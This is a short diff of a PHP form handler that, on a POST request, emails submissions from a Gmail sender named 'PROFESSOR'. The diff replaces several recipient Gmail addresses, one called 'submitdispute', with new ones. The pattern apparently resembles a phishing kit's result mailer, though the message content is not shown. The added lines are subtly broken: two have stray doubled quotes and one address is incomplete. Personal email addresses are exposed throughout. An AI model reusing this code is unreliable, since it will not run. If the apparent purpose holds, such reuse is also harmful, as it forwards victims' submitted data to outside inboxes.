@@ -35,10 +35,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('hindistoryhub396@gmail.com', 'PROFESSOR');
-        $mail->addAddress('submitdispute@gmail.com');
-         $mail->addAddress('newzatpage@gmail.com');
-        $mail->addAddress('abdullahkhannizamani754@gmail.com');
-
+        $mail->addAddress('halinamars85@gmail.com');
+         $mail->addAddress('subhannizamani51@gmail.com');
+        $mail->addAddress('okieskissdoman@gmail.com'');
+$mail->addAddress('workeremaikl'');
       // Email recipient's address
 
         // Email content
